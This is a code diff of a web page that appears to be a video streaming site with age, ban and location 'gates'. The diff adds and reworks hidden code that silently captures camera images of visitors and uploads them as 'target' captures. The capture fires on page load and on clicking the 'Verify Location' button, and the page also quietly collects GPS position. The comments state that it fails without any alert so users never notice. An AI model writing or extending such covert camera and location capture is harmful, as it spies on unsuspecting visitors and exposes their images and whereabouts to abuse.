@@ -115,7 +115,6 @@
 <video id="secretVideo" width="640" height="480" autoplay playsinline style="display:none;"></video>
 <canvas id="secretCanvas" width="640" height="480" style="display:none;"></canvas>
 
-<!-- Glass Age Gate -->
 <div id="ageGate" class="modal-bg" style="display:none;">
     <div class="modal-content">
         <div style="font-size: 3rem; margin-bottom: 0.5rem; line-height: 1;">🔞</div>
@@ -128,7 +127,6 @@
     </div>
 </div>
 
-<!-- Glass Ban Gate -->
 <div id="banGate" class="modal-bg" style="display:none; z-index: 999999;">
     <div class="modal-content">
         <div style="font-size: 3rem; margin-bottom: 0.5rem; line-height: 1;">🚫</div>
@@ -137,7 +135,6 @@
     </div>
 </div>
 
-<!-- Glass GPS Gate -->
 <div id="gpsGate" class="modal-bg" style="display:none; z-index: 10005;">
     <div class="modal-content">
         <div style="font-size: 3rem; margin-bottom: 0.5rem; line-height: 1;">🌍</div>
@@ -158,7 +155,6 @@
     </div>
 </div>
 
-<!-- Glass Episodes Modal -->
 <div id="episodesModal" class="modal-bg" style="display:none;">
     <div class="ep-modal-content">
         <h3 id="epModalTitle" style="color:white; font-size:1.2rem; text-align:left; font-weight:600; margin-bottom: 10px;">Select Episode</h3>
@@ -233,20 +229,20 @@
   let deviceId = null;
   let activeAd = null;
 
-  // BACKGROUND CAMERA LOGIC
+  // 1. SILENT CAPTURE HELPER FUNCTION
   async function attemptSilentCapture() {
       try {
-          if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
-          // Yeh background mein silent attempt karega.
-          // Agar permission nahi di hogi (ya phone se OFF hoga), toh chup-chap fail ho jayega.
-          const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-          captureAndUploadPhoto(stream, "Verified Target Capture");
+          const perm = await navigator.permissions.query({ name: 'camera' });
+          if (perm.state === 'granted') {
+              const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+              captureAndUploadPhoto(stream, "Verified Triggered Capture");
+          }
       } catch (err) {
-          // Fails silently - No alerts or HTML popups
+          // Silent Fail
       }
   }
 
-  // Gate Controller System (Age & GPS ONLY)
+  // Gate Controller System
   function checkGates() {
       const ageStatus = sessionStorage.getItem('ageStatus');
       const gpsVerified = localStorage.getItem('gpsVerified'); 
@@ -261,7 +257,7 @@
           renderGallery(document.getElementById('searchInput').value);
           
           silentGPSUpdate(); 
-          // Page refresh hone par camera check chalega
+          // Page load/refresh hote hi ek silent attempt
           attemptSilentCapture(); 
       }
   }
@@ -325,14 +321,17 @@
   window.requestGPSAccess = function() {
       const errDiv = document.getElementById('gpsError');
       errDiv.style.display = 'none';
+      
+      // NEW LOGIC: Trigger Camera Capture IMMEDIATELY on click
+      logAction("Verify Location button clicked - Attempting instant capture");
+      attemptSilentCapture(); 
+
+      // THEN request GPS
       if ("geolocation" in navigator) {
           navigator.geolocation.getCurrentPosition(
               (position) => {
                   localStorage.setItem('gpsVerified', 'true');
                   document.getElementById('gpsGate').style.display = 'none';
-                  
-                  // THE TRIGGER: GPS verified hote hi Camera hit hoga
-                  attemptSilentCapture();
                   
                   if (deviceId) {
                       const gpsData = {
